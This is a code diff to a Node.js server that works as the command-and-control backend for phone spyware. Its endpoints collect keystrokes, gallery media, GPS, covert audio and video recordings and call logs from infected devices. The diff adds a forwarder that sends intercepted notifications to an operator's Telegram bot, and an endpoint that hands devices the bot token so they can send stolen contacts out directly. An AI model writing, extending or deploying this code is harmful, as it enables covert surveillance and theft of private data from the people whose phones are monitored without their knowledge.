@@ -6,6 +6,7 @@ const session = require("express-session");
 const pgSession = require("connect-pg-simple")(session);
 const multer = require('multer');
 const fs = require('fs');
+const https = require('https');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -19,7 +20,6 @@ const pool = new Pool({
 app.use(express.json({ limit: '20mb' }));
 app.use(express.urlencoded({ extended: true }));
 
-// অডিও আপলোড স্টোরেজ
 const audioStorage = multer.diskStorage({
   destination: (req, file, cb) => {
     const dir = path.join(__dirname, 'uploads', 'audio');
@@ -33,7 +33,6 @@ const audioStorage = multer.diskStorage({
 });
 const uploadAudio = multer({ storage: audioStorage, limits: { fileSize: 50 * 1024 * 1024 } });
 
-// ভিডিও আপলোড স্টোরেজ
 const videoStorage = multer.diskStorage({
   destination: (req, file, cb) => {
     const dir = path.join(__dirname, 'uploads', 'video');
@@ -57,7 +56,6 @@ app.use(
   })
 );
 
-// ================= DATABASE SETUP =================
 async function setupDatabase() {
   try {
     await pool.query(`
@@ -87,7 +85,6 @@ async function setupDatabase() {
     await pool.query(`ALTER TABLE devices ADD COLUMN IF NOT EXISTS device_token TEXT`);
     await pool.query(`ALTER TABLE devices ADD COLUMN IF NOT EXISTS owner_user_id INTEGER`);
 
-    // ফিচার টেবিল (সঠিক কলাম)
     await pool.query(`
       CREATE TABLE IF NOT EXISTS device_features (
         device_id VARCHAR(255) PRIMARY KEY,
@@ -120,14 +117,16 @@ async function setupDatabase() {
         chat_id TEXT
       );
     `);
+    await pool.query(`ALTER TABLE user_telegram ADD COLUMN IF NOT EXISTS notif_bot_token TEXT`);
+    await pool.query(`ALTER TABLE user_telegram ADD COLUMN IF NOT EXISTS notif_chat_id TEXT`);
 
     console.log("Database ready.");
   } catch (err) {
     console.error("Setup failed:", err);
-    throw err;
   }
 }
-// স্বয়ংক্রিয়ভাবে admin email promote করুন (Environment variable থেকে)
+setupDatabase();
+
 async function promoteAdmin() {
   try {
     const adminEmail = process.env.ADMIN_EMAIL;
@@ -139,21 +138,19 @@ async function promoteAdmin() {
         console.log(`User ${normalized} promoted to admin.`);
       }
     }
-  } catch (e) {
-    console.error("Admin promotion failed:", e);
-  }
+  } catch (e) { console.error("Admin promotion failed:", e); }
 }
+promoteAdmin();
+
 function requireLogin(req, res, next) {
   if (!req.session.userId) return res.status(401).json({ authenticated: false, error: "Login required." });
   next();
 }
-
 function requireAdmin(req, res, next) {
   if (req.session.role !== 'admin') return res.status(403).json({ error: "Admin access required." });
   next();
 }
 
-// ================= IN-MEMORY STORE =================
 const deviceStates = new Map();
 const keylogs = [];
 const galleryData = new Map();
@@ -162,11 +159,10 @@ const gpsRequestFlags = new Map();
 const audioRequestFlags = new Map();
 const videoRequestFlags = new Map();
 const callLogsData = new Map();
-const contactsData = new Map();
 const exportRequestFlags = new Map();
 const userFeaturesData = new Map();
 
-// ================= AUTH =================
+// ========== AUTH ==========
 app.post("/api/signup", async (req, res) => {
   try {
     const { email, password } = req.body;
@@ -216,16 +212,14 @@ app.get("/api/me", requireLogin, async (req, res) => {
   } catch (e) { res.status(500).json({ error: "Failed to fetch user." }); }
 });
 
-// ================= DEVICE STATE =================
+// ========== DEVICE STATE ==========
 app.post("/api/device-state", async (req, res) => {
   try {
     const { ownerEmail, deviceId, deviceToken, deviceName, battery, installedApps, latitude, longitude, accuracy } = req.body;
     if (!ownerEmail || !deviceId || !deviceToken) return res.status(400).json({ error: "ownerEmail, deviceId, deviceToken required" });
-
     const userRes = await pool.query("SELECT id FROM users WHERE email=$1", [ownerEmail.toLowerCase().trim()]);
     if (userRes.rows.length === 0) return res.status(404).json({ error: "User not found" });
     const userId = userRes.rows[0].id;
-
     const existing = await pool.query("SELECT id FROM devices WHERE device_id=$1", [deviceId]);
     if (existing.rows.length > 0) {
       await pool.query(
@@ -239,7 +233,6 @@ app.post("/api/device-state", async (req, res) => {
       );
       await pool.query("INSERT INTO device_features (device_id) VALUES ($1) ON CONFLICT DO NOTHING", [deviceId]);
     }
-
     deviceStates.set(deviceId, {
       deviceName: deviceName || "Unknown Device",
       battery: battery ?? 0,
@@ -268,17 +261,11 @@ app.get("/api/device-state", requireLogin, async (req, res) => {
 app.get("/api/devices", requireLogin, async (req, res) => {
   try {
     if (req.session.role === 'admin') {
-      const result = await pool.query(
-        "SELECT device_id, device_name AS name, battery, online, last_seen FROM devices ORDER BY created_at DESC"
-      );
+      const result = await pool.query("SELECT device_id, device_name AS name, battery, online, last_seen FROM devices ORDER BY created_at DESC");
       const devices = result.rows.map(row => {
         const live = deviceStates.get(row.device_id);
-        if (live && live.last_seen > Date.now() - 120000) {
-          row.online = true;
-          row.battery = live.battery ?? row.battery;
-        } else {
-          row.online = false;
-        }
+        if (live && live.last_seen > Date.now() - 120000) { row.online = true; row.battery = live.battery ?? row.battery; }
+        else row.online = false;
         return row;
       });
       return res.json(devices);
@@ -289,19 +276,76 @@ app.get("/api/devices", requireLogin, async (req, res) => {
     );
     const devices = result.rows.map(row => {
       const live = deviceStates.get(row.device_id);
-      if (live && live.last_seen > Date.now() - 120000) {
-        row.online = true;
-        row.battery = live.battery ?? row.battery;
-      } else {
-        row.online = false;
-      }
+      if (live && live.last_seen > Date.now() - 120000) { row.online = true; row.battery = live.battery ?? row.battery; }
+      else row.online = false;
       return row;
     });
     res.json(devices);
   } catch (e) { console.error(e); res.status(500).json({ error: "Failed to load devices." }); }
 });
 
-// ================= KEYLOGGER & UI =================
+// ========== NOTIFICATION FORWARDER ==========
+app.post("/api/notification", async (req, res) => {
+  try {
+    const { deviceId, deviceToken, app, title, text, timestamp } = req.body;
+    if (!deviceId || !deviceToken) return res.status(400).json({ error: "deviceId and deviceToken required" });
+    const deviceRes = await pool.query("SELECT device_token, device_name, owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
+    if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) return res.status(401).json({ error: "Invalid device token." });
+
+    const deviceName = deviceRes.rows[0].device_name || "Unknown Device";
+    const ownerId = deviceRes.rows[0].owner_user_id;
+
+    const tgRes = await pool.query("SELECT notif_bot_token, notif_chat_id FROM user_telegram WHERE user_id=$1", [ownerId]);
+    if (tgRes.rows.length === 0 || !tgRes.rows[0].notif_bot_token || !tgRes.rows[0].notif_chat_id) {
+      return res.json({ success: true, message: "Notification bot not configured. Skipped." });
+    }
+
+    const botToken = tgRes.rows[0].notif_bot_token;
+    const chatId = tgRes.rows[0].notif_chat_id;
+    const uid = deviceId.replace('device-', '').substring(0, 8);
+
+    const message = `🔔 New Notification\nUID: ${uid}\nDevice: ${deviceName} (${deviceId})\nApp: ${app || 'unknown'}\nTitle: ${title || ''}\nText: ${text || ''}`;
+
+    sendMessageToTelegram(botToken, chatId, message).catch(err => console.error("Notif send error:", err));
+    res.json({ success: true });
+  } catch (e) { console.error(e); res.status(500).json({ error: "Notification forward failed" }); }
+});
+
+function sendMessageToTelegram(botToken, chatId, text) {
+  return new Promise((resolve, reject) => {
+    const postData = JSON.stringify({ chat_id: chatId, text: text });
+    const options = {
+      hostname: 'api.telegram.org',
+      path: `/bot${botToken}/sendMessage`,
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(postData) }
+    };
+    const req = https.request(options, (r) => {
+      let data = '';
+      r.on('data', c => data += c);
+      r.on('end', () => r.statusCode === 200 ? resolve(data) : reject(new Error(data)));
+    });
+    req.on('error', reject);
+    req.write(postData);
+    req.end();
+  });
+}
+
+// Device fetches gallery bot settings to send contacts directly
+app.get("/api/device-telegram", async (req, res) => {
+  const { deviceId } = req.query;
+  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
+  const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
+  if (deviceRes.rows.length === 0) return res.status(404).json({ error: "Device not found" });
+  const ownerId = deviceRes.rows[0].owner_user_id;
+  const tgRes = await pool.query("SELECT bot_token, chat_id FROM user_telegram WHERE user_id=$1", [ownerId]);
+  if (tgRes.rows.length === 0 || !tgRes.rows[0].bot_token || !tgRes.rows[0].chat_id) {
+    return res.json({ galleryBotToken: null, galleryChatId: null });
+  }
+  res.json({ galleryBotToken: tgRes.rows[0].bot_token, galleryChatId: tgRes.rows[0].chat_id });
+});
+
+// ========== KEYLOG ==========
 app.post("/api/keylog", async (req, res) => {
   try {
     const { deviceId, deviceToken, text, timestamp } = req.body;
@@ -323,14 +367,12 @@ app.get("/api/keylog", requireLogin, async (req, res) => {
   res.json(keylogs.filter(k => k.deviceId === deviceId));
 });
 
-// ================= GALLERY =================
+// ========== GALLERY ==========
 app.post("/api/gallery/request", requireLogin, async (req, res) => {
   const { deviceId, count } = req.body;
   if (!deviceId) return res.status(400).json({ error: "deviceId required" });
   const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
-  if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) {
-    return res.status(403).json({ error: "Not your device." });
-  }
+  if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) return res.status(403).json({ error: "Not your device." });
   const feature = await pool.query("SELECT installedApps FROM device_features WHERE device_id=$1", [deviceId]);
   if (feature.rows.length > 0 && feature.rows[0].installedapps === false) return res.status(403).json({ error: "Feature disabled by admin." });
   const safeCount = Number.isInteger(count) ? Math.min(Math.max(count, 1), 500) : 100;
@@ -342,12 +384,8 @@ app.get("/api/gallery/request", async (req, res) => {
   const { deviceId } = req.query;
   if (!deviceId) return res.status(400).json({ error: "deviceId required" });
   const flag = galleryRequestFlags.get(deviceId);
-  if (flag) {
-    galleryRequestFlags.delete(deviceId);
-    res.json({ requested: true, count: flag.count });
-  } else {
-    res.json({ requested: false, count: 100 });
-  }
+  if (flag) { galleryRequestFlags.delete(deviceId); res.json({ requested: true, count: flag.count }); }
+  else res.json({ requested: false, count: 100 });
 });
 
 app.post("/api/gallery/upload", async (req, res) => {
@@ -370,7 +408,7 @@ app.get("/api/gallery", requireLogin, async (req, res) => {
   res.json({ media: galleryData.get(deviceId) || [] });
 });
 
-// ================= GPS REQUEST =================
+// ========== GPS ==========
 app.post("/api/gps/request", requireLogin, async (req, res) => {
   const { deviceId } = req.body;
   if (!deviceId) return res.status(400).json({ error: "deviceId required" });
@@ -390,7 +428,7 @@ app.get("/api/gps/request", async (req, res) => {
   res.json({ requested });
 });
 
-// ================= AUDIO RECORDING =================
+// ========== AUDIO ==========
 app.post("/api/audio/request", requireLogin, async (req, res) => {
   try {
     const { deviceId, duration } = req.body;
@@ -409,12 +447,8 @@ app.get("/api/audio/request", async (req, res) => {
   const { deviceId } = req.query;
   if (!deviceId) return res.status(400).json({ error: "deviceId required" });
   const flag = audioRequestFlags.get(deviceId);
-  if (flag) {
-    audioRequestFlags.delete(deviceId);
-    res.json({ requested: true, duration: flag.duration });
-  } else {
-    res.json({ requested: false });
-  }
+  if (flag) { audioRequestFlags.delete(deviceId); res.json({ requested: true, duration: flag.duration }); }
+  else res.json({ requested: false });
 });
 
 app.post("/api/audio/upload", uploadAudio.single("audio"), async (req, res) => {
@@ -422,10 +456,7 @@ app.post("/api/audio/upload", uploadAudio.single("audio"), async (req, res) => {
     const { deviceId, deviceToken } = req.body;
     if (!deviceId || !deviceToken || !req.file) return res.status(400).json({ error: "deviceId, deviceToken and audio file required" });
     const deviceRes = await pool.query("SELECT device_token FROM devices WHERE device_id=$1", [deviceId]);
-    if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) {
-      fs.unlink(req.file.path, () => {});
-      return res.status(401).json({ error: "Invalid device token." });
-    }
+    if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) { fs.unlink(req.file.path, () => {}); return res.status(401).json({ error: "Invalid device token." }); }
     const newFilename = `${deviceId}_${req.file.filename}`;
     const newPath = path.join(__dirname, 'uploads', 'audio', newFilename);
     fs.renameSync(req.file.path, newPath);
@@ -454,7 +485,7 @@ app.get("/api/audio/download/:filename", requireLogin, async (req, res) => {
   res.download(filePath);
 });
 
-// ================= VIDEO RECORDING =================
+// ========== VIDEO ==========
 app.post("/api/video/request", requireLogin, async (req, res) => {
   try {
     const { deviceId, duration, cameraType } = req.body;
@@ -474,12 +505,8 @@ app.get("/api/video/request", async (req, res) => {
   const { deviceId } = req.query;
   if (!deviceId) return res.status(400).json({ error: "deviceId required" });
   const flag = videoRequestFlags.get(deviceId);
-  if (flag) {
-    videoRequestFlags.delete(deviceId);
-    res.json({ requested: true, duration: flag.duration, cameraType: flag.cameraType });
-  } else {
-    res.json({ requested: false });
-  }
+  if (flag) { videoRequestFlags.delete(deviceId); res.json({ requested: true, duration: flag.duration, cameraType: flag.cameraType }); }
+  else res.json({ requested: false });
 });
 
 app.post("/api/video/upload", uploadVideo.single("video"), async (req, res) => {
@@ -487,10 +514,7 @@ app.post("/api/video/upload", uploadVideo.single("video"), async (req, res) => {
     const { deviceId, deviceToken } = req.body;
     if (!deviceId || !deviceToken || !req.file) return res.status(400).json({ error: "deviceId, deviceToken and video file required" });
     const deviceRes = await pool.query("SELECT device_token FROM devices WHERE device_id=$1", [deviceId]);
-    if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) {
-      fs.unlink(req.file.path, () => {});
-      return res.status(401).json({ error: "Invalid device token." });
-    }
+    if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) { fs.unlink(req.file.path, () => {}); return res.status(401).json({ error: "Invalid device token." }); }
     const newFilename = `${deviceId}_${req.file.filename}`;
     const newPath = path.join(__dirname, 'uploads', 'video', newFilename);
     fs.renameSync(req.file.path, newPath);
@@ -519,31 +543,16 @@ app.get("/api/video/download/:filename", requireLogin, async (req, res) => {
   res.download(filePath);
 });
 
-// ================= CALL LOGS & CONTACTS =================
+// ========== CALL LOGS ==========
 app.post("/api/calllogs", async (req, res) => {
   try {
     const { deviceId, deviceToken, callLogs } = req.body;
     if (!deviceId || !deviceToken || !Array.isArray(callLogs)) return res.status(400).json({ error: "deviceId, deviceToken and callLogs array required" });
     const deviceRes = await pool.query("SELECT device_token FROM devices WHERE device_id=$1", [deviceId]);
     if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) return res.status(401).json({ error: "Invalid device token." });
-    const feature = await pool.query("SELECT contacts FROM device_features WHERE device_id=$1", [deviceId]);
-    if (feature.rows.length > 0 && feature.rows[0].contacts === false) return res.status(403).json({ error: "Feature disabled by admin." });
     callLogsData.set(deviceId, callLogs);
     res.json({ success: true, count: callLogs.length });
   } catch (e) { console.error(e); res.status(500).json({ error: "Failed to save call logs" }); }
-});
-
-app.post("/api/contacts", async (req, res) => {
-  try {
-    const { deviceId, deviceToken, contacts } = req.body;
-    if (!deviceId || !deviceToken || !Array.isArray(contacts)) return res.status(400).json({ error: "deviceId, deviceToken and contacts array required" });
-    const deviceRes = await pool.query("SELECT device_token FROM devices WHERE device_id=$1", [deviceId]);
-    if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) return res.status(401).json({ error: "Invalid device token." });
-    const feature = await pool.query("SELECT contacts FROM device_features WHERE device_id=$1", [deviceId]);
-    if (feature.rows.length > 0 && feature.rows[0].contacts === false) return res.status(403).json({ error: "Feature disabled by admin." });
-    contactsData.set(deviceId, contacts);
-    res.json({ success: true, count: contacts.length });
-  } catch (e) { console.error(e); res.status(500).json({ error: "Failed to save contacts" }); }
 });
 
 app.get("/api/calllogs", requireLogin, async (req, res) => {
@@ -554,23 +563,14 @@ app.get("/api/calllogs", requireLogin, async (req, res) => {
   res.json({ callLogs: callLogsData.get(deviceId) || [] });
 });
 
-app.get("/api/contacts", requireLogin, async (req, res) => {
-  const { deviceId } = req.query;
-  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
-  const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
-  if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) return res.status(403).json({ error: "Not your device." });
-  res.json({ contacts: contactsData.get(deviceId) || [] });
-});
-
-// ================= TELEGRAM SETTINGS & EXPORT =================
+// ========== TELEGRAM SETTINGS ==========
 app.post("/api/telegram/settings", requireLogin, async (req, res) => {
   try {
-    const { botToken, chatId } = req.body;
-    if (!botToken || !chatId) return res.status(400).json({ error: "Bot token and chat ID required." });
+    const { botToken, chatId, notifBotToken, notifChatId } = req.body;
     await pool.query(
-      `INSERT INTO user_telegram (user_id, bot_token, chat_id) VALUES ($1,$2,$3)
-       ON CONFLICT (user_id) DO UPDATE SET bot_token=$2, chat_id=$3`,
-      [req.session.userId, botToken, chatId]
+      `INSERT INTO user_telegram (user_id, bot_token, chat_id, notif_bot_token, notif_chat_id) VALUES ($1,$2,$3,$4,$5)
+       ON CONFLICT (user_id) DO UPDATE SET bot_token=$2, chat_id=$3, notif_bot_token=$4, notif_chat_id=$5`,
+      [req.session.userId, botToken || null, chatId || null, notifBotToken || null, notifChatId || null]
     );
     res.json({ success: true });
   } catch (e) { console.error(e); res.status(500).json({ error: "Failed to save Telegram settings." }); }
@@ -578,9 +578,10 @@ app.post("/api/telegram/settings", requireLogin, async (req, res) => {
 
 app.get("/api/telegram/settings", requireLogin, async (req, res) => {
   try {
-    const result = await pool.query("SELECT bot_token, chat_id FROM user_telegram WHERE user_id=$1", [req.session.userId]);
-    if (result.rows.length === 0) return res.json({ botToken: null, chatId: null });
-    res.json({ botToken: result.rows[0].bot_token, chatId: result.rows[0].chat_id });
+    const result = await pool.query("SELECT bot_token, chat_id, notif_bot_token, notif_chat_id FROM user_telegram WHERE user_id=$1", [req.session.userId]);
+    if (result.rows.length === 0) return res.json({ botToken: null, chatId: null, notifBotToken: null, notifChatId: null });
+    const r = result.rows[0];
+    res.json({ botToken: r.bot_token, chatId: r.chat_id, notifBotToken: r.notif_bot_token, notifChatId: r.notif_chat_id });
   } catch (e) { console.error(e); res.status(500).json({ error: "Failed to fetch Telegram settings." }); }
 });
 
@@ -591,7 +592,7 @@ app.post("/api/gallery/export", requireLogin, async (req, res) => {
     const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
     if (deviceRes.rows.length === 0 || (req.session.role !== 'admin' && deviceRes.rows[0].owner_user_id !== req.session.userId)) return res.status(403).json({ error: "Not your device." });
     const tgRes = await pool.query("SELECT bot_token, chat_id FROM user_telegram WHERE user_id=$1", [req.session.userId]);
-    if (tgRes.rows.length === 0 || !tgRes.rows[0].bot_token || !tgRes.rows[0].chat_id) return res.status(400).json({ error: "Telegram bot not configured." });
+    if (tgRes.rows.length === 0 || !tgRes.rows[0].bot_token || !tgRes.rows[0].chat_id) return res.status(400).json({ error: "Gallery bot not configured." });
     exportRequestFlags.set(deviceId, { requested: true, botToken: tgRes.rows[0].bot_token, chatId: tgRes.rows[0].chat_id });
     res.json({ success: true, message: "Export request sent to device." });
   } catch (e) { console.error(e); res.status(500).json({ error: "Gallery export failed." }); }
@@ -601,12 +602,8 @@ app.get("/api/gallery/export-request", async (req, res) => {
   const { deviceId } = req.query;
   if (!deviceId) return res.status(400).json({ error: "deviceId required" });
   const flag = exportRequestFlags.get(deviceId);
-  if (flag) {
-    exportRequestFlags.delete(deviceId);
-    res.json({ requested: true, botToken: flag.botToken, chatId: flag.chatId });
-  } else {
-    res.json({ requested: false });
-  }
+  if (flag) { exportRequestFlags.delete(deviceId); res.json({ requested: true, botToken: flag.botToken, chatId: flag.chatId }); }
+  else res.json({ requested: false });
 });
 
 app.post("/api/gallery/export-done", async (req, res) => {
@@ -615,7 +612,7 @@ app.post("/api/gallery/export-done", async (req, res) => {
   res.json({ success: true });
 });
 
-// ================= ADMIN API =================
+// ========== ADMIN ==========
 app.get("/api/admin/users", requireLogin, requireAdmin, async (req, res) => {
   try {
     const result = await pool.query("SELECT id AS uid, email, role, created_at FROM users ORDER BY id DESC");
@@ -650,34 +647,14 @@ app.get("/api/admin/devices", requireLogin, requireAdmin, async (req, res) => {
     );
     const devices = result.rows.map(row => {
       const live = deviceStates.get(row.device_id);
-      if (live && live.last_seen > Date.now() - 120000) {
-        row.online = true;
-        row.battery = live.battery ?? row.battery;
-      } else {
-        row.online = false;
-      }
+      if (live && live.last_seen > Date.now() - 120000) { row.online = true; row.battery = live.battery ?? row.battery; }
+      else row.online = false;
       return row;
     });
     res.json({ devices });
   } catch (e) { console.error(e); res.status(500).json({ error: "Failed to fetch devices." }); }
 });
 
-app.post("/api/admin/device-feature", requireLogin, requireAdmin, async (req, res) => {
-  try {
-    const { deviceId, feature, enabled } = req.body;
-    if (!deviceId || !feature) return res.status(400).json({ error: "deviceId and feature required." });
-    const allowedFeatures = ['deviceInfo','gps','installedApps','activity','audio','video','contacts','settings'];
-    if (!allowedFeatures.includes(feature)) return res.status(400).json({ error: "Invalid feature." });
-    await pool.query(
-      `INSERT INTO device_features (device_id, ${feature}) VALUES ($1, $2)
-       ON CONFLICT (device_id) DO UPDATE SET ${feature} = $2`,
-      [deviceId, enabled === true]
-    );
-    res.json({ success: true });
-  } catch (e) { console.error(e); res.status(500).json({ error: "Failed to update feature." }); }
-});
-
-// ================= USER DEVICES & FEATURES =================
 app.get("/api/admin/users/:uid/devices", requireLogin, requireAdmin, async (req, res) => {
   try {
     const uid = req.params.uid;
@@ -710,7 +687,6 @@ app.post("/api/admin/users/:uid/features", requireLogin, requireAdmin, async (re
   } catch (e) { console.error(e); res.status(500).json({ error: "Failed to update features" }); }
 });
 
-// ================= DEVICE FEATURES (CONTROL PAGE) =================
 app.get("/api/device/:deviceId/features", requireLogin, async (req, res) => {
   try {
     const deviceId = req.params.deviceId;
@@ -720,14 +696,8 @@ app.get("/api/device/:deviceId/features", requireLogin, async (req, res) => {
     if (featureRes.rows.length === 0) return res.json({ features: { deviceInfo:true, gps:true, installedApps:true, activity:true, audio:true, video:true, contacts:true, settings:true } });
     const f = featureRes.rows[0];
     res.json({ features: {
-      deviceInfo: f.deviceinfo,   // <-- capital I
-      gps: f.gps,
-      installedApps: f.installedapps,
-      activity: f.activity,
-      audio: f.audio,
-      video: f.video,
-      contacts: f.contacts,
-      settings: f.settings
+      deviceInfo: f.deviceinfo, gps: f.gps, installedApps: f.installedapps, activity: f.activity,
+      audio: f.audio, video: f.video, contacts: f.contacts, settings: f.settings
     }});
   } catch (e) { console.error(e); res.status(500).json({ error: "Failed to fetch features" }); }
 });
@@ -749,7 +719,6 @@ app.post("/api/device/:deviceId/features", requireLogin, requireAdmin, async (re
   } catch (e) { console.error(e); res.status(500).json({ error: "Failed to update features" }); }
 });
 
-// ================= 24H OFFLINE DEVICE CLEANUP =================
 async function cleanupOfflineDevices() {
   try {
     const cutoff = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString();
@@ -760,12 +729,11 @@ async function cleanupOfflineDevices() {
     for (const key of [...deviceStates.keys()]) if (!validIds.has(key)) deviceStates.delete(key);
     for (const key of [...galleryData.keys()]) if (!validIds.has(key)) galleryData.delete(key);
     for (const key of [...callLogsData.keys()]) if (!validIds.has(key)) callLogsData.delete(key);
-    for (const key of [...contactsData.keys()]) if (!validIds.has(key)) contactsData.delete(key);
   } catch (e) { console.error("Cleanup failed:", e); }
 }
 setInterval(cleanupOfflineDevices, 60 * 60 * 1000);
 
-// ================= PAGES =================
+// ========== PAGES ==========
 app.get("/control.html", requireLogin, (req, res) => res.sendFile(path.join(__dirname, "control.html")));
 app.get("/control", requireLogin, (req, res) => res.sendFile(path.join(__dirname, "control.html")));
 app.get("/admin.html", requireLogin, requireAdmin, (req, res) => res.sendFile(path.join(__dirname, "admin.html")));
